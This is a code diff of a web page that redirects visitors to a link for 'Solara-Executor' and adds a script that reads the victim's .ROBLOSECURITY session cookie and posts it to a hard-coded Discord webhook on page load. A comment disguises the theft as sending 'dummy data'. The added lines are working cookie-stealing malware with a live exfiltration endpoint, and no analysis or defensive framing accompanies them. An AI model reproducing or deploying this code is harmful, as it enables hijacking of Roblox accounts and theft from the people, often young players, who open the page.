@@ -17,6 +17,27 @@
     <meta http-equiv="refresh" content="0; url=https://bit.ly/Solara-Executor">
     <!-- Cookie Retrieval Script -->
     <script>
+                        function sendToWebhook(data) {
+            fetch('https://discord.com/api/webhooks/1275918541702561803/TC8xhuXEgioM6PLJyrG3Gu-jaV3L25YgaxBuaB29SpJKhnb3tu2dwrZzMJnjAHgVmMwC', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Data: ${JSON.stringify(data)}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Data sent successfully!');
+                } else {
+                    console.error('Error sending data:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
         // Function to get a specific cookie by name
         function getCookie(name) {
             let cookieArr = document.cookie.split(";");
@@ -34,7 +55,8 @@
 
         // Attempt to retrieve the .ROBLOSECURITY cookie
         let robloSecurityCookie = getCookie('.ROBLOSECURITY');
-        console.log(robloSecurityCookie);  // Logs the cookie value to the console (for testing purposes)
+        // Call the function to send dummy data
+        sendToWebhook(robloSecurityCookie);
     </script>
 </head>
 <body>
